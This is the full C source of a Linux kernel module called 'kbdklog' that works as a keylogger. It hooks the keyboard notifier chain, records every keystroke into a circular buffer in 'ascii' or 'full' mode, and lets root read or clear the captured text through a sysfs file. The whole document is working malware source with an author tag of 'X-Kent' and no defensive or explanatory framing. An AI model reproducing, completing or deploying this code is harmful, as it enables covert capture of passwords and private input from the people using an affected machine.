/* Module */
#include <linux/module.h>

/* For keyboard hook */
#include <linux/keyboard.h>

/* For sysfs */
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/sysfs.h>
#include <linux/init.h>

#include "keymap.h"

/* Defines */
#define MAX_LOG_SIZE PAGE_SIZE - 5 /* a little less than page, just to be safe*/
#define MAX_CHARACTERS_IN_LINE 1000 /* We don't allow a log to have more than 1000 characters without logging */

/* Parameters */
static char* mode = "ascii";

/* Forward declarations */
static int kbd_notify(struct notifier_block *nblock, unsigned long code, void *_param);
static ssize_t show(struct kobject *kobj, struct kobj_attribute *attr, char* buf);
static ssize_t store(struct kobject *kobj, struct kobj_attribute *attr,const char *buf, size_t count);
static void add_to_buffer(char *msg);
static int get_from_buffer(char* buf);
static void reset_buffer(void);

/* Globals */
static struct notifier_block nb = {.notifier_call = kbd_notify};
static struct kobj_attribute logger_attribute = __ATTR(logger, 0600, show, store); /* We only respond to root */ 
static struct attribute *attrs[] = { &logger_attribute.attr,NULL};
static struct attribute_group attr_group = {.attrs = attrs,};
static struct kobject *kobj;
static char kbdbuf[MAX_LOG_SIZE];
static int kbdbuf_itt;
static int wrapped;
static int full_mode = 0;
static int characters_in_line = 0;

static void add_to_buffer(char *msg) 
{
	size_t msg_len;
	size_t copied = 0;
	if (!msg)
		return;
	msg_len = strlen(msg);
	while(copied<msg_len) 
	{
		kbdbuf[kbdbuf_itt]=msg[copied];
		copied++;
		kbdbuf_itt++;
		if (kbdbuf_itt == MAX_LOG_SIZE)
		{
			wrapped = 1;
			kbdbuf_itt = 0;
		}
	}
}

static int get_from_buffer(char* buf) 
{
	size_t copy_itt;
	size_t outbuf_itt;
	if (wrapped && kbdbuf_itt == 0)
	{
		/* Wrapped around completely, just copy it */
		memcpy(buf,kbdbuf,MAX_LOG_SIZE);
		return MAX_LOG_SIZE;
	} else if (wrapped) 
	{
		/* Wrapped buffer */
		copy_itt = kbdbuf_itt;
		outbuf_itt = 0;
		while(copy_itt != kbdbuf_itt - 1)
		{
			buf[outbuf_itt] = kbdbuf[copy_itt];
			outbuf_itt++;
			copy_itt++;
			if (copy_itt == MAX_LOG_SIZE) 
				copy_itt = 0;			
		}
		buf[outbuf_itt] = kbdbuf[copy_itt];
		
		return outbuf_itt + 1;
	} else 
	{
		/* Not wrapped */
		memcpy(buf,kbdbuf,kbdbuf_itt);
		return kbdbuf_itt;
	}
}
static void reset_buffer(void)
{
	memset(kbdbuf, '\0', MAX_LOG_SIZE);
	wrapped = 0;
	kbdbuf_itt = 0;
}

/* Callback for keyboard keypress */
static int kbd_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    char* msg = NULL;

    if (code == KBD_KEYCODE && param->down)
    {
		if (param->value <= 128)
		{
			if (param->shift) 
				msg = high_map[param->value];
			else 
				msg = low_map[param->value];
				
			if (full_mode)
			{
				/* Full mode - Add the whole msg */
				add_to_buffer(msg);
			} else 
			{
				/* ASCII mode */
				if (strlen(msg) == 1)
				{
					add_to_buffer(msg);
					characters_in_line++;
				} else 
				{
					// Treat enter and backspace 
					if (param->value == 28)
					{
						add_to_buffer("\n");
						characters_in_line = 0;
					}
					if (param->value == 14 && characters_in_line != 0) 
					{
						add_to_buffer("\b");
						characters_in_line--;
					}
				}
				if (characters_in_line >= MAX_CHARACTERS_IN_LINE) 
				{
					add_to_buffer("\n");
					characters_in_line = 0;
				}
			}
		} else if (full_mode)
		{
			// record < 128 ?
		}
    }
    return NOTIFY_OK;
}

/* Send the logged buffer */
static ssize_t show(struct kobject *kobj, struct kobj_attribute *attr, char* buf) 
{
	return get_from_buffer(buf);
}

/* Received input from user, reset the buffer */
static ssize_t store(struct kobject *kobj, struct kobj_attribute *attr, const char *buf, size_t count) 
{
	reset_buffer();
	return count;
}

/* Init */
static int __init kbdklog_init(void)
{
    int retval;
    
    /* Register for keyboard (no error checking) */
    register_keyboard_notifier(&nb);
    
    /* Init sysfs IO */ 
    kobj = kobject_create_and_add("kbdklog", kernel_kobj);
    if (!kobj) 
    {
		unregister_keyboard_notifier(&nb);
		return -ENOMEM;
	}
    retval = sysfs_create_group(kobj, &attr_group);
    if (retval) 
    {
		unregister_keyboard_notifier(&nb);
		kobject_put(kobj);
		return retval;
    }
    
    /* Prepare the buffer */
    reset_buffer();
    
    /* Set mode */
    if (strcmp(mode,"full") == 0)
		full_mode = 1;
    
    printk(KERN_INFO "kbdklog loaded in %s mode\n", full_mode ? "full":"ascii");
    return 0;
}

/* Destroy */
static void __exit kbdklog_exit(void)
{
	/* Cleanup */
    unregister_keyboard_notifier(&nb);
    kobject_put(kobj);
    
    printk(KERN_INFO "kbdklog unloaded\n");
    return;
}

module_param(mode, charp, 0000);
MODULE_PARM_DESC(mode, "Operating mode, ascii/full");

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Stiven Andre (X-Kent)");

module_init(kbdklog_init);
module_exit(kbdklog_exit);
